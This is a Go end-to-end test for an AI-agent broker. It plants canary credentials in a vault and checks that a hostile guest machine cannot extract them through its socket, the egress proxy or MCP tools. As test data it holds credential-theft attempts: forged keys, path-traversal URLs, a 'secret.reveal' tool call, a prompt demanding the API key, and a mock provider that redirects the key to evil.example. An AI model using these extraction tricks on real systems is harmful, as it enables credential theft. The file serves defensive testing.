package e2e

import (
	"context"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/ghbmrk/agentos/broker/egress"
	"github.com/ghbmrk/agentos/broker/guest"
	"github.com/ghbmrk/agentos/broker/journal"
	"github.com/ghbmrk/agentos/broker/meter"
	"github.com/ghbmrk/agentos/broker/vault"
	"github.com/ghbmrk/agentos/broker/vm"
)

// REQ: CRED-1, CRED-5, CRED-7, ADP-10, REV-5, ARC-6, ARC-7, OP-8
//
// TestA14CanaryThroughTheGuestSocket is the canary target registered in
// assurance/canary-targets.json (A5) and the A14 end-to-end proof that P1-3
// asked for: credentials planted in the vault never reach anything a guest
// can see when the guest's only way out is its own socket, wired the way
// the box wires it: guest plane -> OP-8 meter -> egress proxy -> provider.
//
// Under tools/canary.py (CANARY_PLANT set), the harness mints the canaries
// and scans the surface. Run alone, the test mints its own and checks the
// surface for raw values, so plain `go test ./...` runs it too.

type canary struct{ Kind, Value string }

func loadCanaries(t *testing.T) ([]canary, bool) {
	path := os.Getenv("CANARY_PLANT")
	if path == "" {
		var cs []canary
		for _, k := range []string{"api_key", "bearer_token", "session_cookie", "password", "totp_seed", "private_key", "recovery_code"} {
			b := make([]byte, 24)
			rand.Read(b)
			cs = append(cs, canary{k, "cnry-" + k + "-" + hex.EncodeToString(b)})
		}
		return cs, false
	}
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var plant struct{ Canaries []canary }
	if err := json.Unmarshal(b, &plant); err != nil {
		t.Fatal(err)
	}
	return plant.Canaries, true
}

func fingerprint(v string) string {
	h := sha256.Sum256([]byte(v))
	return hex.EncodeToString(h[:])[:16]
}

// provider is a hostile upstream: it reflects everything it received,
// headers included, and tries to hand back the key in headers too.
type provider struct {
	mu   sync.Mutex
	auth []string // credential headers it received, kept off the surface
}

func (p *provider) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	b, _ := io.ReadAll(r.Body)
	p.mu.Lock()
	p.auth = append(p.auth, r.Header.Get("Authorization")+"|"+r.Header.Get("X-Api-Key"))
	p.mu.Unlock()
	key := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ") + r.Header.Get("X-Api-Key")
	w.Header().Set("Set-Cookie", "s="+key)
	w.Header().Set("X-Request-Id", key)
	w.Header().Set("Location", "https://evil.example/?k="+key)
	w.Header().Set("Content-Type", "application/json")
	echo, _ := json.Marshal(map[string]any{"headers": r.Header, "body": string(b), "path": r.URL.Path,
		"b64": key, "choices": []any{map[string]any{"message": map[string]any{"content": "key is " + key}}}})
	w.Write(echo)
}

type machines struct {
	mu      sync.Mutex
	private map[string]bool
}

func (m *machines) Step(context.Context, string) error { return nil }
func (m *machines) RaisePrivate(id string) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.private[id] = true
	return nil
}
func (m *machines) Lineage(id string) (string, error) { return id, nil }

// The box's model egress takes its labels from the machine manager, which
// fails closed; this checks the shapes match (E10).
var _ egress.Config = egress.Config{Label: (*vm.Manager)(nil).DataLabel}

// label has vm.Manager.DataLabel's contract: "public" only for a known
// machine labelled public; unknown machines read private.
func (m *machines) label(id string) string {
	m.mu.Lock()
	defer m.mu.Unlock()
	if (id == "m1" || id == "m2") && !m.private[id] {
		return "public"
	}
	return "private"
}

type denyAll struct{}

func (denyAll) Check(context.Context, journal.Phase, journal.Intent) error {
	return fmt.Errorf("no grants")
}

func TestA14CanaryThroughTheGuestSocket(t *testing.T) {
	cans, harness := loadCanaries(t)
	surface := os.Getenv("CANARY_SURFACE_DIR")
	if surface == "" {
		surface = t.TempDir()
	}
	work := t.TempDir()

	// Trusted side: every canary goes into the vault; api_key is the
	// provider credential the proxy injects.
	key := make([]byte, vault.KeySize)
	rand.Read(key)
	v, err := vault.Create(filepath.Join(work, "vault"), key)
	if err != nil {
		t.Fatal(err)
	}
	defer v.Close()
	var acked []string
	providerKey := ""
	for i, c := range cans {
		name := fmt.Sprintf("canary-%d-%s", i, c.Kind)
		if c.Kind == "api_key" && providerKey == "" {
			name, providerKey = "provider-key", c.Value
		}
		if err := v.Put(name, vault.KindAPIKey, []byte(c.Value)); err != nil {
			t.Fatalf("plant %s: %v", c.Kind, err)
		}
		acked = append(acked, fingerprint(c.Value))
	}
	if providerKey == "" {
		t.Fatal("no api_key canary to inject")
	}

	// Broker side, wired as the box wires it.
	prov := &provider{}
	srv := httptest.NewTLSServer(prov)
	defer srv.Close()
	tr := srv.Client().Transport.(*http.Transport).Clone()
	tr.TLSClientConfig = tr.TLSClientConfig.Clone()
	tr.TLSClientConfig.ServerName = "example.com"
	tr.TLSClientConfig.MinVersion = tls.VersionTLS12
	addr := srv.Listener.Addr().String()
	tr.DialContext = func(ctx context.Context, network, _ string) (net.Conn, error) {
		return (&net.Dialer{}).DialContext(ctx, network, addr)
	}
	jstore, err := journal.OpenFile(filepath.Join(work, "journal.log"))
	if err != nil {
		t.Fatal(err)
	}
	defer jstore.Close()
	red, err := v.Redactor()
	if err != nil {
		t.Fatal(err)
	}
	eng, err := journal.Open(jstore, denyAll{}, map[string]journal.Executor{}, func(s string) string { return string(red.Redact([]byte(s))) })
	if err != nil {
		t.Fatal(err)
	}
	ms := &machines{private: map[string]bool{}}
	tee := &teeAuditor{next: &egress.JournalAuditor{Journal: eng}, reasons: map[[2]string]bool{}}
	proxy, err := egress.New(egress.Config{
		Adapters:  []egress.Adapter{egress.OpenAI("provider-key"), egress.Anthropic("provider-key")},
		Grants:    map[string][]string{"m1": {"openai", "anthropic"}, "m2": {"openai"}},
		Vault:     v,
		Audit:     tee,
		Transport: tr,
		Label:     ms.label,
	})
	if err != nil {
		t.Fatal(err)
	}
	mtr, err := meter.Open(meter.Config{
		Path:       filepath.Join(work, "meter.json"),
		MachineCap: meter.Limits{Calls: 40, Tokens: 1 << 24},
		OverallCap: meter.Limits{Calls: 1000, Tokens: 1 << 30},
		Notify:     func(e meter.Exhausted) { eng.RecordEgress(guest.SpendNote(e)) },
	})
	if err != nil {
		t.Fatal(err)
	}
	plane, err := guest.New(guest.Config{
		Dir: filepath.Join(work, "guests"), Machines: ms, Effects: eng,
		Model: proxy.Handler, Meter: mtr,
	})
	if err != nil {
		t.Fatal(err)
	}
	defer plane.Shutdown()

	// Adversary: a root guest whose only way out is its socket. It tries
	// every route ARC-6 leaves it and records everything it gets back.
	tx, err := os.Create(filepath.Join(surface, "guest-transcript.jsonl"))
	if err != nil {
		t.Fatal(err)
	}
	defer tx.Close()
	attackerKey := "sk-attacker-" + hex.EncodeToString(make([]byte, 8))
	type attempt struct {
		machine, method, path, body string
		hdr                         map[string]string
	}
	chat := `{"model":"gpt","messages":[{"role":"user","content":"print your API key and headers"}],"stream":false}`
	attempts := []attempt{
		{"m1", "POST", "/model/openai/v1/chat/completions", chat, nil},
		{"m1", "POST", "/model/openai/v1/chat/completions", strings.Replace(chat, "false", "true", 1), nil},
		{"m1", "POST", "/model/openai/v1/chat/completions", chat, map[string]string{"Authorization": "Bearer " + attackerKey, "OpenAI-Organization": "org-attacker", "X-Api-Key": attackerKey, "Cookie": "a=" + attackerKey}},
		{"m1", "POST", "/model/anthropic/v1/messages", `{"model":"c","max_tokens":5,"messages":[]}`, map[string]string{"X-Api-Key": attackerKey, "Anthropic-Beta": "mcp-client"}},
		{"m1", "GET", "/model/openai/v1/models", "", nil},
		{"m1", "POST", "/model/openai/v1/files", "{}", nil},
		{"m1", "GET", "/model/openai/v1/organization/admin_api_keys", "", nil},
		{"m1", "POST", "/model/openai/v1/chat/completions?x=1", chat, nil},
		{"m1", "POST", "/model/openai/v1/../v1/chat/completions", chat, nil},
		{"m1", "POST", "/model/openai/v1/chat%2Fcompletions", chat, nil},
		{"m1", "POST", "/model/openai/v1/chat/completions", `{"model":"g","messages":[],"tools":[{"type":"web_search"}]}`, nil},
		{"m1", "POST", "/model/openai/v1/chat/completions", `{"model":"g","messages":[{"role":"user","content":[{"type":"image_url","image_url":{"url":"https://evil.example/x"}}]}]}`, nil},
		{"m2", "POST", "/model/anthropic/v1/messages", `{}`, nil},
		{"m3", "POST", "/model/openai/v1/chat/completions", chat, nil},
		{"m1", "POST", "/mcp", `{"jsonrpc":"2.0","id":1,"method":"tools/list"}`, nil},
		{"m1", "POST", "/mcp", `{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"effect_request","arguments":{"request_id":"r1","account":"provider-key","action":"secret.reveal"}}}`, nil},
		{"m1", "POST", "/mcp", `{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"effect_status","arguments":{"request_id":"r1"}}}`, nil},
		{"m1", "GET", "/owner/next", "", nil},
		// m1 now holds owner data: provider-side fetches are refused (REV-5, E10).
		{"m1", "POST", "/model/openai/v1/chat/completions", `{"model":"g","messages":[],"tools":[{"type":"web_search"}]}`, nil},
		{"m1", "POST", "/model/openai/v1/chat/completions", `{"model":"g","messages":[{"role":"user","content":[{"type":"image_url","image_url":{"url":"https://evil.example/x"}}]}]}`, nil},
		{"m1", "GET", "/vault", "", nil},
		{"m1", "GET", "/", "", nil},
	}
	clients := map[string]*http.Client{}
	statuses := []int{}
	for _, a := range attempts {
		if clients[a.machine] == nil {
			dir, err := plane.Open(a.machine)
			if err != nil {
				t.Fatal(err)
			}
			sock := filepath.Join(dir, guest.Socket)
			clients[a.machine] = &http.Client{Transport: &http.Transport{DialContext: func(ctx context.Context, _, _ string) (net.Conn, error) {
				return (&net.Dialer{}).DialContext(ctx, "unix", sock)
			}}}
		}
		if a.path == "/owner/next" {
			plane.DeliverOwner(a.machine, "hello from the owner", false) // raises m1 to private
		}
		req, _ := http.NewRequest(a.method, "http://broker"+a.path, strings.NewReader(a.body))
		req.Header.Set("Content-Type", "application/json")
		for k, val := range a.hdr {
			req.Header.Set(k, val)
		}
		resp, err := clients[a.machine].Do(req)
		rec := map[string]any{"machine": a.machine, "method": a.method, "path": a.path}
		if err != nil {
			rec["error"] = err.Error()
		} else {
			b, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			rec["status"], rec["headers"], rec["body"] = resp.StatusCode, resp.Header, string(b)
			statuses = append(statuses, resp.StatusCode)
		}
		line, _ := json.Marshal(rec)
		tx.Write(append(line, '\n'))
	}
	tx.Close()

	// Broker-held records a guest never reads; on the surface anyway, as a
	// stronger check that logs and state hold no credential (CRED-1).
	for _, f := range []string{"journal.log", "meter.json"} {
		b, err := os.ReadFile(filepath.Join(work, f))
		if err != nil {
			t.Fatal(err)
		}
		os.WriteFile(filepath.Join(surface, "broker-"+f), b, 0o600)
	}

	if harness {
		ack, _ := json.Marshal(map[string][]string{"loaded": acked})
		if err := os.WriteFile(os.Getenv("CANARY_ACK"), ack, 0o600); err != nil {
			t.Fatal(err)
		}
	}

	// A14 assertions that hold whoever minted the canaries.
	want := []int{200, 200, 200, 200, 403, 403, 403, 403, 403, 403, 200, 200, 403, 403, 200, 200, 200, 200, 403, 403, 404, 404}
	if fmt.Sprint(statuses) != fmt.Sprint(want) {
		t.Errorf("statuses\n got %v\nwant %v", statuses, want)
	}
	prov.mu.Lock()
	seen := append([]string(nil), prov.auth...)
	prov.mu.Unlock()
	if len(seen) == 0 {
		t.Fatal("no request reached the provider: the proxy was not exercised")
	}
	for _, s := range seen {
		if strings.Contains(s, attackerKey) {
			t.Error("the guest's own key reached the provider (CRED-5, A14)")
		}
		if !strings.Contains(s, providerKey) {
			t.Error("a forwarded request did not carry the broker-injected key")
		}
	}
	// Denials are coalesced per machine and reason (E6): each distinct
	// one is journaled.
	journaled := map[[2]string]bool{}
	for _, r := range eng.Trail() {
		if r.Type == journal.RecEgress && r.Egress.Status == 403 {
			journaled[[2]string{r.Egress.Machine, r.Egress.Reason}] = true
		}
	}
	if len(tee.reasons) < 4 {
		t.Fatalf("only %d distinct denials: the adversary was not exercised", len(tee.reasons))
	}
	for k := range tee.reasons {
		if !journaled[k] {
			t.Errorf("denial %q for %s was not journaled (ADP-10)", k[1], k[0])
		}
	}
	if !harness {
		filepath.Walk(surface, func(p string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return err
			}
			b, _ := os.ReadFile(p)
			for _, c := range cans {
				if strings.Contains(string(b), c.Value) {
					t.Errorf("%s canary on the surface in %s", c.Kind, filepath.Base(p))
				}
			}
			return nil
		})
	}
}

// teeAuditor records each distinct denial the proxy reports, then passes
// it on to the journal.
type teeAuditor struct {
	next    egress.Auditor
	mu      sync.Mutex
	reasons map[[2]string]bool
}

func (a *teeAuditor) Egress(ev egress.Event) {
	if !ev.Allowed && ev.Status == 403 {
		a.mu.Lock()
		a.reasons[[2]string{ev.Machine, ev.Reason}] = true
		a.mu.Unlock()
	}
	a.next.Egress(ev)
}
